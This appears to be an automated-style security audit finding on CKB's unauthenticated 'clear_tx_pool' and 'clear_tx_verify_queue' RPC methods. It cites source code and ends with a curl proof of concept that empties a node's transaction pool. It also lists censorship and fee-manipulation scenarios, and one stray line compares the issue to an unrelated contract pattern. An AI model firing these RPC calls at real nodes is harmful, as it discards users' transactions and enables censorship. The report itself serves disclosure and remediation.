### Title
Unauthenticated `clear_tx_pool` and `clear_tx_verify_queue` RPC Methods Allow Any Caller to Drain the Transaction Pool — (`rpc/src/module/pool.rs`)

### Summary
The `Pool` RPC module exposes `clear_tx_pool` and `clear_tx_verify_queue` as public endpoints with no caller authentication or access-control check. Any RPC client that can reach the node's JSON-RPC port — including any local process or any remote client when the operator has bound the RPC to a non-loopback interface — can invoke these methods and instantly remove every pending transaction from the pool. This is the direct CKB analog of the `adjustMechRequesterBalances` missing-marketplace-check pattern: a state-mutating function that should be restricted to a privileged caller (the node operator) but is callable by anyone.

### Finding Description

**Root cause — no caller identity check in `clear_tx_pool` / `clear_tx_verify_queue`**

`clear_tx_pool` is declared in the `PoolRpc` trait and implemented in `PoolRpcImpl`:

```rust
// rpc/src/module/pool.rs  lines 322-323
#[rpc(name = "clear_tx_pool")]
fn clear_tx_pool(&self) -> Result<()>;
```

```rust
// rpc/src/module/pool.rs  lines 684-692
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [1](#0-0) [2](#0-1) 

`clear_tx_verify_queue` follows the same pattern:

```rust
// rpc/src/module/pool.rs  lines 349-350
#[rpc(name = "clear_tx_verify_queue")]
fn clear_tx_verify_queue(&self) -> Result<()>;
```

```rust
// rpc/src/module/pool.rs  lines 694-700
fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_verify_queue()
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [3](#0-2) [4](#0-3) 

Neither function performs any check on who is calling it. There is no token, session, IP allowlist, or any other guard.

**The RPC server has no authentication layer**

The HTTP server is built with `CorsLayer::permissive()` and no middleware that could restrict callers:

```rust
// rpc/src/server.rs  lines 119-129
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← no auth, all origins allowed
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
``` [5](#0-4) 

**The `Pool` module is enabled by default**

The default configuration includes `Pool` in the enabled modules list:

```toml
# resource/ckb.toml  line 190
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
``` [6](#0-5) 

**The downstream effect is total pool erasure**

`clear_pool` in the tx-pool service removes every entry from the pool and resets the snapshot:

```rust
// tx-pool/src/service.rs  lines 972-980
Message::ClearPool(Request { responder, arguments: new_snapshot }) => {
    service.clear_pool(new_snapshot).await;
    if let Err(e) = responder.send(()) {
        error!("Responder sending clear_pool failed {:?}", e)
    };
}
``` [7](#0-6) 

`clear_tx_verify_queue` empties the pending verification queue:

```rust
// tx-pool/src/service.rs  lines 981-985
Message::ClearVerifyQueue(Request { responder, .. }) => {
    service.verify_queue.write().await.clear();
    ...
}
``` [8](#0-7) 

### Impact Explanation

An attacker who can reach the RPC port can:

1. **Drain all pending transactions** — every transaction submitted by users is silently discarded. Users must detect the loss and resubmit, with no guarantee of timely inclusion.
2. **Disrupt miner revenue** — the block assembler has no transactions to package, so the miner produces empty blocks and collects only the base reward, losing all fee income.
3. **Enable targeted censorship** — by repeatedly calling `clear_tx_pool` after each new submission, an attacker can prevent any specific transaction from ever being included in a block. This is particularly damaging for time-sensitive operations such as DAO withdrawals, which must be committed within a specific epoch window.
4. **Manipulate the fee market** — clearing the pool and immediately submitting attacker-controlled transactions at low fees guarantees priority inclusion with no competition.

### Likelihood Explanation

The RPC binds to `127.0.0.1:8114` by default, so the baseline attacker must be a local process on the node host. This is a realistic scenario for:

- Shared hosting or cloud environments where multiple tenants share a machine.
- Any web service co-located with the node that can be exploited to make localhost HTTP requests (SSRF).
- Operators who expose the RPC on a public interface (a common operational pattern for remote management), which the documentation explicitly warns against but does not prevent at the code level.

No credentials, keys, or privileged access are required — a single unauthenticated HTTP POST suffices.

### Recommendation

Add an operator-configurable allowlist of IP addresses or a bearer-token check enforced at the RPC middleware layer. At minimum, `clear_tx_pool` and `clear_tx_verify_queue` should be gated behind a separate, opt-in module (similar to how `IntegrationTest` is a distinct module that requires explicit enablement and is asserted to run only on Dummy PoW chains):

```rust
// rpc/src/service_builder.rs  lines 151-158
if self.config.integration_test_enable() {
    assert_eq!(
        shared.consensus().pow,
        Pow::Dummy,
        "Only run integration test on Dummy PoW chain"
    );
}
``` [9](#0-8) 

Move `clear_tx_pool` and `clear_tx_verify_queue` out of the default `Pool` module into a new `Admin` or `Maintenance` module that is disabled by default and requires explicit opt-in, mirroring the pattern used for `IntegrationTest`.

### Proof of Concept

```bash
# Step 1 – submit a transaction to the pool (standard user action)
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":[<valid_tx_json>,"passthrough"]}'

# Step 2 – verify it is pending
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# → "pending": "0x1"

# Step 3 – attacker (no credentials) clears the entire pool
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# → {"result": null}   ← succeeds with no authentication

# Step 4 – pool is now empty; the user's transaction is gone
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":4,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# → "pending": "0x0"
```

Expected outcome: the call in Step 3 succeeds unconditionally, removing all pending transactions. The same applies to `clear_tx_verify_queue`. No token, signature, or privileged role is required.

### Citations

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L349-350)
```rust
    #[rpc(name = "clear_tx_verify_queue")]
    fn clear_tx_verify_queue(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-700)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** resource/ckb.toml (L190-190)
```text
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
```

**File:** tx-pool/src/service.rs (L972-980)
```rust
        Message::ClearPool(Request {
            responder,
            arguments: new_snapshot,
        }) => {
            service.clear_pool(new_snapshot).await;
            if let Err(e) = responder.send(()) {
                error!("Responder sending clear_pool failed {:?}", e)
            };
        }
```

**File:** tx-pool/src/service.rs (L981-985)
```rust
        Message::ClearVerifyQueue(Request { responder, .. }) => {
            service.verify_queue.write().await.clear();
            if let Err(e) = responder.send(()) {
                error!("Responder sending clear_verify_queue failed {:?}", e)
            };
```

**File:** rpc/src/service_builder.rs (L151-158)
```rust
        if self.config.integration_test_enable() {
            // IntegrationTest only on Dummy PoW chain
            assert_eq!(
                shared.consensus().pow,
                Pow::Dummy,
                "Only run integration test on Dummy PoW chain"
            );
        }
```
